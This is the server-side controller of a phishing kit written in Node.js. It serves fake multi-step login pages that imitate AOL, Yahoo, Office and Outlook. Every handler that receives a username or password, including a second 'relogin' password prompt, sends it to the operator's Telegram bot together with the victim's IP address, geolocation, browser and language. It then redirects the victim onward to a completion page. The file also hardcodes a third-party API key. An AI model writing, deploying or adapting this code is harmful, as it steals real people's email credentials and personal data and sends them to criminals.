const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../../settings");
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;




exports.login = (req, res) => {
	return res.render("login");
};

exports.login2 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login2");
			break;
		case "yahoo":
			return res.render("yahoo/login2");
			break;
		case "office":
			return res.render("office/login2");
			break;
		case "outlook":
			return res.render("office/login2");
			break;
		default:
			return res.render("login2");
			break;
	}
};

exports.loginPost2 = async (req, res) => {
	const { username, email_provider } = req.body;
	const sendAPIRequest = async (ipAddress) => {
		try {
			const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
			console.log(apiResponse.data);
			return apiResponse.data;
		} catch (error) {
			console.error("Error fetching IP data:", error.message);
			return {}; // Return an empty object to prevent crashes
		}
	};

	const ipAddress = getClientIp(req);
	const ipAddressInformation = await sendAPIRequest(ipAddress);

	try {
		console.log(ipAddressInformation);

		const userAgent = req.headers["user-agent"];
		const systemLang = req.headers["accept-language"];

		const message =
			`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
			`👤 EMAIL INFO\n` +
			`EMAIL PROVIDER   : ${email_provider}\n` +
			`USER             : ${username}\n\n` +
			`🌍 GEO-IP INFO\n` +
			`IP ADDRESS       : ${ipAddress}\n` +
			`TIME             : ${ipAddressInformation?.location?.timeZone?.localTime || "Unknown"}\n` +
			`USER AGENT       : ${userAgent}\n` +
			`SYSTEM LANGUAGE  : ${systemLang}\n` +
			`💬 Telegram: https://t.me/UpdateTeams\n`;

		console.log("message :" + message);

		try {
			const sendMessage = sendMessageFor(botToken, chatId);
			await sendMessage(message);
		} catch (sendError) {
			console.error("Error sending Telegram message:", sendError.message);
		}

		return res.redirect(`/auth/login/3?email_provider=${email_provider}`);
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
};

process.on('unhandledRejection', (reason, promise) => {
	console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

exports.login3 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login3");
			break;
		case "yahoo":
			return res.render("yahoo/login3");
			break;
		case "office":
			return res.render("office/login3");
			break;
		case "outlook":
			return res.render("office/login3");
			break;
		default:
			return res.render("login3");
			break;
	}
};

exports.loginPost3 = async (req, res) => {
	const { password, email_provider } = req.body;
	const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

    console.log("chai");
    
	const message =
		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
         
	try {
			const sendMessage = sendMessageFor(botToken, chatId);
			await sendMessage(message);
		} catch (sendError) {
			console.error("Error sending Telegram message:", sendError.message);
		}

	return res.redirect(`/auth/login/4?email_provider=${email_provider}`);
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login4 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login4");
			break;
		case "yahoo":
			return res.render("yahoo/login4");
			break;
		case "office":
			return res.render("office/login4");
			break;
		case "outlook":
			return res.render("office/login4");
			break;
		default:
			return res.render("login4");
			break;
	}
};

exports.loginPost4 = async (req, res) => {
	const { password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);
	
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

    console.log("chai");
    
	const message =
		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO (RELOGIN)\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
         
	try {
			const sendMessage = sendMessageFor(botToken, chatId);
			await sendMessage(message);
		} catch (sendError) {
			console.error("Error sending Telegram message:", sendError.message);
		}

	return res.redirect("/auth/complete");
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};
